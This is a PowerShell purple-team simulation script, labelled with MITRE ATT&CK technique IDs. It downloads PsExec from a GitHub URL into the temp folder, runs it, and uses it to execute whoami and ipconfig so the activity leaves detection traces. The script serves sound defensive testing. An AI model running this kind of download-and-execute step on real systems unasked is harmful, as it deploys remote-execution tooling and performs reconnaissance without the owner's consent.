<#
    T1588.002 - Obtain Capabilities: Tool
    T1033 - System Owner/User Discovery
    T1016 - System Network Configuration Discovery
    Download PsExec.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsExec.exe and execute cmd commands on local system with it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force


# Download and execute PsExec.exe (Sysinternals tool)
if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsExec.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsExec64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of PsExec..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsExec.exe"
}

$dumpfile = "$env:tmp\psexc_result.txt"
$outfile = "$env:tmp\psexc.exe"

# Download and execute PsExec on local system
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: PsExec.exe downloaded to $outfile"
        Write-Host -ForegroundColor Cyan "Executing commands with psexec on local system for simulation..."
        $tdate = Get-Date
        "$outfile -accepteula -nobanner -d cmd.exe /c `"echo test psexec at $tdate : > $dumpfile`" 2>/dev/null" | cmd
        "$outfile -accepteula -nobanner -d cmd.exe /c `"whoami >> $dumpfile`" 2>/dev/null" | cmd
        "$outfile -accepteula -nobanner -d cmd.exe /c `"ipconfig >> $dumpfile`" 2>/dev/null" | cmd
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download PsExec.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: PSExec executed succesfully and results saved to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to execute PSExec and save the result to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
